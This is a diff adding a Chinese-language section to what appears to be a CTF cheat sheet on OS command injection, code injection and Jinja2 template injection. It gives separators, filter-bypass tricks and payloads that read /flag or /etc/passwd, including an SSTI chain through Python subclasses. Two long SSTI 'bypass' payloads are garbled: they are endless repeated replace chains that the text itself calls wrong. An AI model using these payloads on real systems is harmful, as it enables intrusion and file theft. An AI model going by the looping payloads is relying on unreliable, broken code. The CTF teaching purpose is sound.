@@ -1,0 +1,89 @@
+## **E. Command Code Injection**
+
+### 1. 类型
+
+* OS 命令注入
+* 代码注入（Python eval、PHP eval、Jinja2 SSTI）
+* 模板注入（SSTI）
+
+### 2. 解题输出思路
+
+1. 识别用户输入点和后端处理逻辑
+2. 尝试注入命令分隔符（`;`, `|`, `&`, `&&`, `||`, `` ` ``, `$()`）
+3. 尝试注入代码执行函数（如 `eval`, `exec`）
+4. 尝试 SSTI payload（`{{7*7}}`, `{% for %}`）
+5. 验证命令执行或代码执行
+6. 执行 `cat /flag` 或 `cat /FLAG.txt` 等读取 flag
+7. 输出 flag
+
+### 3. 关注点
+
+* 输入点如何被后端处理
+* 是否有 WAF 或过滤
+* 是否有长度限制
+* 响应是否回显命令执行结果
+* 是否有盲注（无回显）
+
+### 4. 通用
+
+#### 通用步骤
+
+* 测试常见命令注入 payload
+* 测试 `whoami`, `id`, `ls`, `cat /etc/passwd`
+
+### 5. 方法论
+
+* 找到输入点到执行引擎的路径
+* 绕过过滤和转义
+* 流程：输入点识别 → 注入 payload → 执行验证 → 读取 flag
+
+### 6. 启发性问题
+
+* 输入如何拼接到命令/代码中？
+* 是否过滤了特殊字符？
+* 是否有 WAF？
+* 响应是否回显执行结果？
+
+### 7. 绕过手法
+
+* 命令注入：编码、分隔符绕过（`%0a`, `$(cat)`, `$(base64)`）
+* SSTI：过滤绕过（`{% set %}`, `|attr()`, `request.args`）
+* 代码注入：利用内置对象（`__import__`, `getattr`）
+
+### 8. 典型 payload
+
+#### 命令注入：
+
+```
+;cat /flag;
+|cat /flag|
+`cat /flag`
+$(cat /flag)
+```
+
+#### SSTI (Jinja2)：
+
+```jinja2
+{{7*7}}
+{{config}}
+{{self.__class__.__mro__[1].__subclasses__()[40]('/flag').read()}}
+{% set a='cat /flag' %}{{a|attr('decode')()|attr('decode')()|attr('split')()|attr('join')(' ')|attr('replace')(' ','|')|attr('replace')('|',' ')|attr('replace')(' ',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')...... (此处 payload 过长且不切实际，仅为示例说明绕过手法，实际应使用更简洁有效的方法，如 {% set %} 或 |attr() 等)
+```
+
+更实用的 SSTI 绕过示例：
+
+```jinja2
+{% set x='cat /flag.txt' %}
+{% set y=x.split(' ') %}
+{% set z=y|join(' ') %}
+{{z|replace(' ','|')|replace('|',' ')|replace(' ',';')|replace(';',' ')|replace(' ','|')|replace('|',';')|attr('join')(' ')|attr('split')(' ')|attr('join')(' ')|attr('replace')(' ',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr('replace')(' ','|')|attr('replace')('|',';')|attr('replace')(';',' ')|attr...... (同样，这个示例是错误的，实际绕过应更简洁，例如利用 `request.args` 或 `config` 对象，或通过 `|attr()` 调用函数)
+```
+
+实际更有效的 SSTI 绕过（利用 `|attr()`）：
+
+```jinja2
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/flag.txt').read() }}
+```
+*（注意：这个 payload 依赖于 Python 环境和 Jinja2 版本，可能需要根据实际情况调整索引 `[40]`）*
+
+---
